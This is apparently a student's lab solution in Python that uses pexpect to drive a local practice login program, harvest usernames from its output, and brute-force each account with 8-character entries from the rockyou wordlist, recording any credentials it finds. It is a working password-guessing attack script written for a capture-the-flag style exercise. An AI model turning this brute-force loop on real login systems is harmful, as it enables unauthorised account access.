#!/usr/bin/python3
# Filename: part1.py
# Author: Ezra Fast
# Course: ITSC203
# Details: This code is the solution for part 1, lab 4, ITSC-203 Scripting for Tool Construction

import pexpect
import random
import string
import itertools

def findUserNamesAndPasswords():
    usernames = []
    child = pexpect.spawn('./testlogin.out')
    child.expect('continue: ')
    child.sendline('')
    child.expect('organization\r\n\t\t')
    child.expect('1.')
    for i in range(1, 7):
        if i > 1 and i < 6:
            child.expect(f'{i}.')
            emailAddress = child.before.decode().strip().split()[2]
            username = emailAddress.split('@')[0]
            usernames.append(username)
        elif i >= 6:
            child.expect('\n')
            emailAddress = child.before.decode().strip().split()[2]
            username = emailAddress.split('@')[0]
            usernames.append(username)
    print(f'Users:')
    for username in usernames:
        print(f'    - {username}')

    print("\nLogin Attempts:\n")

# Users are found, now logins

    # Making the wordlist                   # Comment in lines 40, 42-44, 61-62 for the support of random password generation
    passwordLength = 8
    # possibleCharacters = string.ascii_letters + string.digits
    passwordList = []
    # for possibility in itertools.product(possibleCharacters, repeat=passwordLength):
        # possibility = ''.join(possibility)
        # passwordList.append(possibility)

    rockyouLocation = '/usr/share/wordlists/rockyou.txt'

    with open(rockyouLocation, 'r', errors='ignore') as file:
        rightLength = []
        for line in file:
            line = line.strip()
            if len(line) == 8 and not any(char in string.punctuation or char == " " for char in line):          # Truly Blessed Comprehension
                rightLength.append(line)

    # a list of passwords not to retry would be a redundant addition due to the nature of iterating forward through the list of possibilities.

    counter = 0
    child.sendline('')          # after this is sent, we are in the username/password submission field for good
    try:
        for username in usernames:
            for password in rightLength:    # itertools.product(possibleCharacters, repeat=passwordLength):
                # password = ''.join(password)
                child.expect('username: ')
                child.sendline(f'{username}')
                child.expect('password: ')
                child.sendline(f'{password}')
                counter += 1
                print(f'COUNTER: {counter}, PASSWORD: {password}, USER: {username}')            # verbose output to monitor attempts
                # print(f"before {child.before.decode()} \nafter: {child.after.decode()}\nPASSWORD LENGTH: {len(password)}")        # this is useful for debugging the attempts
                try:
                    result = child.expect(['choice: ', pexpect.TIMEOUT], timeout=0.001)
                    if result == 0:
                        with open('ctf_success_file.txt', 'a') as file:
                            writeString = f"[*] Found: USERID: {username} PASSWORD: {password}"     # not the lab standard, but this format is more readable
                            file.write(writeString)
                            file.write('\n')
                            print(f'\n\n{writeString}\n\n')             # printing a positive alert to the console
                            child.sendline('c')
                            break
                except:
                    pass                    # This is to handle timeout failures gracefully; pexpect is very flawed with regards to child timeout errors.
    except KeyboardInterrupt:
        print("Keyboard Interrupt, Exiting...")             # handling the inevitable Ctrl-C gracefully

if __name__ == "__main__":
    findUserNamesAndPasswords()
